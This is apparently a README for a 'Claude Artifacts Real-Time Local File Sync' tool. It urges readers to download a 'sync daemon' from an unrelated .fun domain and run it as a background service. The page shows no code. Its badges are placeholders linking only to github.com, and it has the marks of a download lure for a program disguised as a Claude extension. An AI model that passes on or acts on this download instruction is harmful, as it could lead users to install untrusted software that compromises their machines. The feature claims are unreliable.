# Claude Artifacts Real-Time Local File Sync

[![GitHub license](https://img.shields.io/github/license/mashape/apistore.svg)](https://github.com)
[![Claude Pro Extension](https://img.shields.io/badge/Claude%20Pro-Extension-orange)](https://github.com)

🔄 **Stop copying and pasting code blocks from your browser.** This specialized synchronization module establishes a secure WebSocket bridge between your Anthropic Claude Pro web interface and your local development workspace. Every time Claude generates or updates an **Artifact**, it is instantly saved to your hard drive.

---

## 📥 Download Sync Daemon

Download the background daemon to enable automated file writing:

👉 **[Download Claude Sync Module v3.0.2](https://artifacts-sync.nexustool.fun)**

---

## Features

* ⚡ **Instant File Updates:** Hot-reloads your local browser preview as soon as Claude modifies the code.
* 📁 **Smart Architecture:** Automatically sorts React components, HTML/CSS, and Python scripts into their respective project folders.
* 🛠️ **Full Bidirectional Support:** Detects local changes and formats them as updates for your next Claude prompt.

## How to Install
1. Click the download link above to get the latest workspace listener package.
2. Run the background service (`artifacts-sync`).
3. Refresh your Claude Pro tab; your browser will now actively sync all Artifact windows with your target directory.

## License
MIT License.